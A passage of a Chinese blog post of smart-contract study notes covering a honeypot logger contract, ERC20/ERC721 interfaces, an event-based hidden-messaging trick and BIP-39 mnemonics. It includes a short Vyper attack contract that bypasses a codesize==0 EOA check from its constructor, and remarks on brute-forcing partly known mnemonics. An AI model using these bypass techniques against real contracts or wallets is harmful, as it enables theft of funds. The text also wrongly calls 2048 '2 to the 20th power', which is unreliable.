gas=msg.gas)</span><br><span class="line">    self.balances[msg.sender] = <span class="number">0</span></span><br><span class="line">    self.logger.logging(msg.sender, amount)</span><br></pre></td></tr></table></figure>
<p>在上面的代码中，似乎 <code>logger</code>
只是简单的日志记录，但实际上我们可以实现同一接口但与常理不同的功能，例如</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#pragma version ^0.3.0</span></span><br><span class="line"></span><br><span class="line">event WithdrawLog:</span><br><span class="line">    beneficiary: address</span><br><span class="line">    amount: uint256</span><br><span class="line"></span><br><span class="line"><span class="meta">@external</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logging</span>(<span class="params">beneficiary: address, amount: uint256</span>):</span><br><span class="line">    <span class="keyword">assert</span> <span class="literal">False</span>, <span class="string">&quot;Ahh! Honey Pot!&quot;</span></span><br></pre></td></tr></table></figure>
<p>这样使得攻击者蒙受损失。</p>
<h3 id="合约代码大小">合约代码大小</h3>
<p>拿到一个合约地址，如何判断其是否是账户地址（EOA）还是合约地址？</p>
<p>在 Solidity 中，常用的是 Yul 汇编函数 <code>extcodesize</code>
获取地址存储的代码大小。</p>
<p>一般情况下，如果代码大小大于
0，我们就认为这个地址应该是合约地址。</p>
<p>在 Vyper 中，一个 <code>address</code> 有以下几个属性</p>
<table>
<colgroup>
<col style="width: 15%">
<col style="width: 10%">
<col style="width: 73%">
</colgroup>
<thead>
<tr class="header">
<th>属性</th>
<th>类型</th>
<th>值</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>balance</code></td>
<td><code>uint256</code></td>
<td>地址余额</td>
</tr>
<tr class="even">
<td><code>codehash</code></td>
<td><code>bytes32</code></td>
<td>地址代码的keccak256哈希值，如果合约未部署，则是默认值
<code>0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470</code>(<a target="_blank" rel="noopener" href="https://eips.ethereum.org/EIPS/eip-1052">EIP-1052</a>)</td>
</tr>
<tr class="odd">
<td><code>codesize</code></td>
<td><code>uint256</code></td>
<td>已部署合约代码字节大小</td>
</tr>
<tr class="even">
<td><code>is_contract</code></td>
<td><code>bool</code></td>
<td>是否是一个已部署的合约地址</td>
</tr>
<tr class="odd">
<td><code>code</code></td>
<td><code>Bytes</code></td>
<td>合约字节码</td>
</tr>
</tbody>
</table>
<p>不过通过合约代码大小判断是否为合约地址的方法有一个漏洞，就是当合约在构造函数结束之前，合约仍未部署，此时地址并没有存储合约代码，但是合约地址已被计算。</p>
<p>包括未调用函数前，我们都是可以计算出合约地址（参考<strong>预导入</strong>），与地址进行交互的。</p>
<p>不过仅限于转账（这是基于地址的），由于合约代码不存在将无法与合约进行交互。</p>
<blockquote>
<p>向空地址转账很有可能导致 ether
烧毁（burning），因为没有人能够使用或取回这些资金。</p>
</blockquote>
<p>比如说一个账户管理合约</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#pragma version ^0.3.0</span></span><br><span class="line"></span><br><span class="line">struct User:</span><br><span class="line">    name: String[<span class="number">32</span>]</span><br><span class="line"></span><br><span class="line">accounts: public(HashMap[address, User])</span><br><span class="line"></span><br><span class="line"><span class="meta">@external</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>(<span class="params">name: String[<span class="number">32</span>]</span>):</span><br><span class="line">    <span class="keyword">assert</span> msg.sender.codesize == <span class="number">0</span>, <span class="string">&quot;Only user account&quot;</span></span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(name) &gt; <span class="number">0</span>, <span class="string">&quot;No name&quot;</span></span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(self.accounts[msg.sender].name) == <span class="number">0</span>, <span class="string">&quot;Exsit&quot;</span></span><br><span class="line">    self.accounts[msg.sender] = User(&#123;name: name&#125;)</span><br></pre></td></tr></table></figure>
<p><code>accounts</code> 使用 <code>HashMap</code>
保存用户信息，<code>register</code> 要求 <code>msg.sender</code>
的必须为 EOA，参数 <code>name</code>
必须有长度，且之前并没有注册过信息。</p>
<p>但是使用 <code>msg.sender.codesize == 0</code>
来判断是否是账户地址是不靠谱的，可以有以下攻击合约</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#pragma version ^0.3.0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># External Interfaces</span></span><br><span class="line">interface Example:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">register</span>(<span class="params">name: String[<span class="number">32</span>]</span>): nonpayable</span><br><span class="line"></span><br><span class="line"><span class="meta">@external</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">victim: address</span>):</span><br><span class="line">    Example(victim).register(<span class="string">&quot;hacker&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>使得合约成功注册。</p>
<p>如果想要保证 <code>msg.sender</code> 是
EOA，可以用更严格的断言：<code>tx.origin == msg.sender</code>。</p>
<p>因为当 <code>msg.sender</code> 不等于 <code>tx.origin</code>
时，则一定是合约发起的消息调用而不是外部账户。</p>
<h2 id="接口">接口</h2>
<h3 id="erc20">ERC20</h3>
<p>ERC20
是以太坊生态系统中最早创建的代币标准之一，也是目前使用最广泛的代币标准之一。</p>
<p>首先我们为什么需要代币？代币（Token）是数字化的资产，可以代表各种形式的价值或权益，例如货币、股票、房地产等。</p>
<p>代币可以是可互换的（fungible），这意味着一个单位的代币可以被另一个单位的代币替代，就像现实世界中的货币一样。在区块链上，代币可以被创建、转移和交易，它们通常是可分割的，允许进行小额交易。</p>
<blockquote>
<p>除此之外还可能引出一个新的概念，非同质化代币（NFT，Non-Fungible
Token）。</p>
<p>NFT 是一种特殊类型的代币，每个 NFT
都是独一无二的，具有唯一性和不可替代性。与普通代币不同，NFT
代表的是独特的数字资产，如数字艺术品、游戏中的道具、虚拟地产等。每个 NFT
都有独特的标识符，使其在区块链上不可互换。这使得 NFT
在数字艺术、收藏品、游戏和虚拟现实等领域有着广泛的应用。</p>
</blockquote>
<p>区块链是开放的，任何人都可以定义、发行代币，比如说比特币，狗狗币等。</p>
<p>以太坊为了满足大家对不同代币之间的可互换性的规范要求，提出了 ERC20
<strong>同质化代币标准</strong>，它们具有一种属性，使得每个代币都与另一个代币（在类型和价值上）完全相同。
例如，一个 ERC-20
代币就像以太币一样，意味着一个代币会并永远会与其他代币一样。</p>
<p>其中标准定义了以下<strong>方法</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function name() public view returns (string)</span><br><span class="line">function symbol() public view returns (string)</span><br><span class="line">function decimals() public view returns (uint8)</span><br><span class="line">function totalSupply() public view returns (uint256)</span><br><span class="line">function balanceOf(address _owner) public view returns (uint256 balance)</span><br><span class="line">function transfer(address _to, uint256 _value) public returns (bool success)</span><br><span class="line">function transferFrom(address _from, address _to, uint256 _value) public returns (bool success)</span><br><span class="line">function approve(address _spender, uint256 _value) public returns (bool success)</span><br><span class="line">function allowance(address _owner, address _spender) public view returns (uint256 remaining)</span><br></pre></td></tr></table></figure>
<p>定义了以下<strong>事件</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">event Transfer(address indexed _from, address indexed _to, uint256 _value)</span><br><span class="line">event Approval(address indexed _owner, address indexed _spender, uint256 _value)</span><br></pre></td></tr></table></figure>
<p>具体细节可以参考 <a target="_blank" rel="noopener" href="https://eips.ethereum.org/EIPS/eip-20">ERC-20</a>。</p>
<p>为了快速生成代币代码，可以复用 OpenZeppelin 的<a target="_blank" rel="noopener" href="https://docs.openzeppelin.com/contracts/4.x/api/token/erc20#ERC20">代码</a>，不过需要注意其增加了一些额外的安全性措施。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract DZCToken is ERC20 &#123;</span><br><span class="line">    constructor(uint256 initialSupply) ERC20(&quot;DZCToken&quot;, &quot;DZC&quot;) &#123;</span><br><span class="line">        _mint(msg.sender, initialSupply);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当然，也可以自己实现。</p>
<blockquote>
<p>Vyper 官方提供 ERC20 的接口，可以通过
<code>from vyper.interfaces import ERC20</code> 的方式导入接口。</p>
</blockquote>
<h3 id="erc721">ERC721</h3>
<p>非同质化代币（NFT）用于以唯一的方式标识某人或者某物。与普通代币不同，NFT
代表的是独特的数字资产，如数字艺术品、游戏中的道具、虚拟地产等。每个 NFT
都有独特的标识符，使其在区块链上不可互换。这使得 NFT
在数字艺术、收藏品、游戏和虚拟现实等领域有着广泛的应用。</p>
<p>ERC721 是为 NFT 设计的<strong>非同质化代币</strong>标准，可以参考 <a target="_blank" rel="noopener" href="https://eips.ethereum.org/EIPS/eip-721">ERC-721</a>。</p>
<p>其中标准定义了以下<strong>方法</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function balanceOf(address _owner) external view returns (uint256);</span><br><span class="line">function ownerOf(uint256 _tokenId) external view returns (address);</span><br><span class="line">function safeTransferFrom(address _from, address _to, uint256 _tokenId, bytes data) external payable;</span><br><span class="line">function safeTransferFrom(address _from, address _to, uint256 _tokenId) external payable;</span><br><span class="line">function transferFrom(address _from, address _to, uint256 _tokenId) external payable;</span><br><span class="line">function approve(address _approved, uint256 _tokenId) external payable;</span><br><span class="line">function setApprovalForAll(address _operator, bool _approved) external;</span><br><span class="line">function getApproved(uint256 _tokenId) external view returns (address);</span><br><span class="line">function isApprovedForAll(address _owner, address _operator) external view returns (bool);</span><br></pre></td></tr></table></figure>
<p>定义了以下<strong>事件</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">event Transfer(address indexed _from, address indexed _to, uint256 indexed _tokenId);</span><br><span class="line">event Approval(address indexed _owner, address indexed _approved, uint256 indexed _tokenId);</span><br><span class="line">event ApprovalForAll(address indexed _owner, address indexed _operator, bool _approved);</span><br></pre></td></tr></table></figure>
<p>与同质化代币不同的是，ERC721 智能合约需要为每一个代币设置独一无二的
NFT 标识符（<code>uint256 tokenId</code>），这时
<code>(contract address, tokenId)</code>
这一对将成为以太坊链上特定资产的全局唯一和完全限定的标识符。</p>
<blockquote>
<p>一般为了方便起见，会从 0 开始，例如第一个 ERC721 NFT 的标识符为
<code>(contract address, 0)</code>，第二个 ERC721 NFT 的标识符为
<code>(contract address, 1)</code>，以此类推。</p>
</blockquote>
<p>同时也在 ERC20 的基础上做了改进，标准化了安全传递函数
<code>safeTransferFrom</code> 。</p>
<p>为了快速生成 NFT 代码，可以复用 OpenZeppelin 的<a target="_blank" rel="noopener" href="https://docs.openzeppelin.com/contracts/4.x/api/token/erc20#ERC20">代码</a>，不过需要注意其增加了一些额外的安全性措施。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin/contracts/token/ERC721/extensions/ERC721URIStorage.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/utils/Counters.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract DZPet is ERC721URIStorage &#123;</span><br><span class="line">    using Counters for Counters.Counter;</span><br><span class="line">    Counters.Counter private _tokenIds;</span><br><span class="line"></span><br><span class="line">    constructor() ERC721(&quot;DZPet&quot;, &quot;DZP&quot;) &#123;&#125;</span><br><span class="line"></span><br><span class="line">    function awardItem(address player, string memory tokenURI)</span><br><span class="line">        public</span><br><span class="line">        returns (uint256)</span><br><span class="line">    &#123;</span><br><span class="line">        uint256 newItemId = _tokenIds.current();</span><br><span class="line">        _mint(player, newItemId);</span><br><span class="line">        _setTokenURI(newItemId, tokenURI);</span><br><span class="line"></span><br><span class="line">        _tokenIds.increment();</span><br><span class="line">        return newItemId;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="erc4626">ERC4626</h3>
<h2 id="脑洞">脑洞</h2>
<h3 id="msb">MSB</h3>
<p>参考<strong>位数据隐匿</strong>，我们可以在高位中隐写信息，类似于图片隐写中的
MSB，这样我们通过合约的 <code>event</code> 机制，使用少量的 gas
就可以达到一定程度的消息隐匿传递。</p>
<p>比如说可以有这么一个监听合约</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.7.0;</span><br><span class="line"></span><br><span class="line">interface MessageListenner &#123;</span><br><span class="line">    function listen(uint248) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract FlagListener is MessageListenner &#123;</span><br><span class="line">    event Flag(uint8);</span><br><span class="line"></span><br><span class="line">    function listen(uint248 x) external override  &#123;</span><br><span class="line">        emit Flag(uint8(msg.data[4]));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>在高版本的 Solidity 中默认启用 ABI coder
v2，所以这里使用低版本方便代码演示，当然也可以通过 <code>pragma</code>
参数修改回 ABI coder v1。</p>
</blockquote>
<p>那么在消息发送方仅需获取 <code>FlagListener</code>
的地址进行外部交易，在第零个字节中藏匿信息发送即可。</p>
<p>而消息接收方通过监听合约事件 <code>Flag</code> 接收信息即可，同时也是
gasless。</p>
<p>在这个消息传递中，消息接收方仅告知外部一个合约接口
<code>MessageListenner</code>
和提供一个链外的合约地址提交接口，有一定的隐匿性。</p>
<p>不过由于这种消息传递方式是建立在双方交换了消息发送方法的前提下的，不如交换密钥后加密发送消息，然后在链上进行验证，所以仅仅只能算是一个利用了
Solidity 特性的<strong>脑洞</strong>。</p>
<blockquote>
<p>所以可以用来出 MISC 的猜谜题。</p>
<p>为了防止合约花费过高导致消息发送者耗费过多的资金，可以对 gas
做出一定限制。</p>
</blockquote>
<p>基于 Hardhat 的一个测试任务</p>
<figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> artifacts <span class="keyword">from</span> <span class="string">&quot;./artifacts/contracts/FlagListener.sol/FlagListener.json&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="title function_">task</span>(<span class="string">&quot;testflag&quot;</span>).<span class="title function_">setAction</span>(<span class="keyword">async</span> (_, &#123; web3 &#125;) =&gt; &#123;</span><br><span class="line">  <span class="comment">// Deploy `FlagListener` contract</span></span><br><span class="line">  <span class="keyword">const</span> [deployer, ] = <span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">getAccounts</span>();</span><br><span class="line">  <span class="keyword">const</span> contract = <span class="keyword">new</span> web3.<span class="property">eth</span>.<span class="title class_">Contract</span>(artifacts.<span class="property">abi</span>);</span><br><span class="line">  <span class="keyword">const</span> rawContract = contract.<span class="title function_">deploy</span>(&#123;</span><br><span class="line">    <span class="attr">data</span>: artifacts.<span class="property">bytecode</span></span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="keyword">const</span> flagListener = <span class="keyword">await</span> rawContract.<span class="title function_">send</span>(&#123;</span><br><span class="line">    <span class="attr">from</span>: deployer</span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="comment">// Get the `Flag` event</span></span><br><span class="line">  <span class="keyword">const</span> eventFlag = flagListener.<span class="property">events</span>.<span class="title class_">Flag</span>()</span><br><span class="line">  <span class="comment">// Listen for every charactor of flag</span></span><br><span class="line">  <span class="keyword">let</span> subcribedFlagHex = <span class="string">&quot;&quot;</span></span><br><span class="line">  eventFlag.<span class="title function_">on</span>(<span class="string">&#x27;data&#x27;</span>, <span class="function">(<span class="params">data</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> hex = data.<span class="property">data</span>[data.<span class="property">data</span>.<span class="property">length</span> - <span class="number">1</span>]</span><br><span class="line">    subcribedFlagHex += hex</span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="comment">// Get the `listen(uint248)` function selector</span></span><br><span class="line">  <span class="keyword">const</span> selector = web3.<span class="property">eth</span>.<span class="property">abi</span>.<span class="title function_">encodeFunctionSignature</span>(&#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&quot;listen&quot;</span>,</span><br><span class="line">    <span class="attr">type</span>: <span class="string">&quot;function&quot;</span>,</span><br><span class="line">    <span class="attr">inputs</span>: [&#123;</span><br><span class="line">      <span class="attr">name</span>: <span class="string">&quot;x&quot;</span>,</span><br><span class="line">      <span class="attr">type</span>: <span class="string">&quot;uint248&quot;</span></span><br><span class="line">    &#125;]</span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="comment">// Send flag</span></span><br><span class="line">  <span class="keyword">const</span> flag = <span class="string">&quot;Aurora&#123;qsdzyyds!&#125;&quot;</span></span><br><span class="line">  <span class="keyword">const</span> hexFlag = web3.<span class="property">utils</span>.<span class="title function_">toHex</span>(flag).<span class="title function_">substring</span>(<span class="number">2</span>)</span><br><span class="line">  <span class="comment">// Only send a single HexString at a time</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; hexFlag.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">const</span> byteString = <span class="string">&quot;0&quot;</span> + hexFlag[i]</span><br><span class="line">    <span class="keyword">const</span> data = selector + byteString + web3.<span class="property">utils</span>.<span class="title function_">keccak256</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>()).<span class="title function_">substring</span>(<span class="number">4</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Send Data: <span class="subst">$&#123;data&#125;</span>`</span>)</span><br><span class="line">    <span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">sendTransaction</span>(&#123;</span><br><span class="line">      <span class="attr">to</span>: flagListener.<span class="property">options</span>.<span class="property">address</span>,</span><br><span class="line">      <span class="attr">data</span>: data</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// Get the flag</span></span><br><span class="line">  <span class="keyword">const</span> finalFlag = web3.<span class="property">utils</span>.<span class="title function_">hexToAscii</span>(<span class="string">&quot;0x&quot;</span> + subcribedFlagHex)</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Final Flag: <span class="subst">$&#123;finalFlag&#125;</span>`</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<h1 id="画外音">画外音</h1>
<h2 id="助记词">助记词</h2>
<p>助记词，也称为恢复短语或种子短语，是存储恢复加密货币钱包所需的全部信息的单词列表。</p>
<p>助记词通常由 12、15、18、21 或 24 个单词组成，这些单词是从一个包含
2048
个单词的预定列表中生成的。助记词的单词数量与安全级别相对应——更多的单词意味着更多的可能组合，因此安全性更高。</p>
<p>助记词是根据加密标准生成的，其中最常见的加密标准是 <a target="_blank" rel="noopener" href="https://github.com/bitcoin/bips/blob/master/bip-0039.mediawiki">BIP-39</a>（比特币第
39 号改进提案）。</p>
<p>在此之外还有 MetaMask 使用的 BIP32/44，或者其他钱包使用的
BIP84、BIP141等。</p>
<p>使用在线网站 <a target="_blank" rel="noopener" href="https://iancoleman.io/bip39/">https://iancoleman.io/bip39/</a>
就可以生成助记词或者通过助记词生成种子、密钥等。</p>
<blockquote>
<p>也可以选择使用 Python 库 <code>mnemonic</code> 来生成。</p>
</blockquote>
<p>同时由于每个词只有 2048（2 的 20
次方）种可能性，如果说大部分助记词被知晓的前提下，可以通过爆破得到用户钱包地址、私钥。</p>
<h1 id="参考">参考</h1>
<ul>
<li>犬子博客：<a target="_blank" rel="noopener" href="https://cauliweak9.github.io/2024/02/11/SmartContractSecurity/">https://cauliweak9.github.io/2024/02/11/SmartContractSecurity/</a></li>
<li><a target="_blank" rel="noopener" href="https://solidity-by-example.org/hello-world/">https://solidity-by-example.org/hello-world/</a></li>
</ul>

    </div>

    
    
    

    <footer class="post-footer">
          

<div class="post-copyright">
<ul>
  <li class="post-copyright-author">
      <strong>本文作者： </strong>qsdz
  </li>
  <li class="post-copyright-link">
      <strong>本文链接：</strong>
      <a href="https://hasegawaazusa.github.io/smart-contract-note.html" title="智能合约笔记">https://hasegawaazusa.github.io/smart-contract-note.html</a>
  </li>
  <li class="post-copyright-license">
      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
  </li>
</ul>
</div>


        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/time-domain-analysis-and-correction.html" rel="prev" title="自动控制原理-线性系统的时域分析与校正">
                  <i class="fa fa-chevron-left"></i> 自动控制原理-线性系统的时域分析与校正
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/sm-series-note.html" rel="next" title="SM系列算法">
                  SM系列算法 <i class="fa fa-chevron-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 2022 – 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder"></span>
</div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
    <span title="站点总字数">771k</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="站点阅读时长">11:41</span>
  </span>
</div>

    </div>
  </footer>

  
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>
  <div class="reading-progress-bar"></div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
<script src="/js/third-party/search/local-search.js"></script>




  <script src="/js/third-party/pace.js"></script>

  




  

  <script class="next-config" data-name="enableMath" type="application/json">true</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"all","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
<script src="/js/third-party/math/mathjax.js"></script>



</body>
</html>
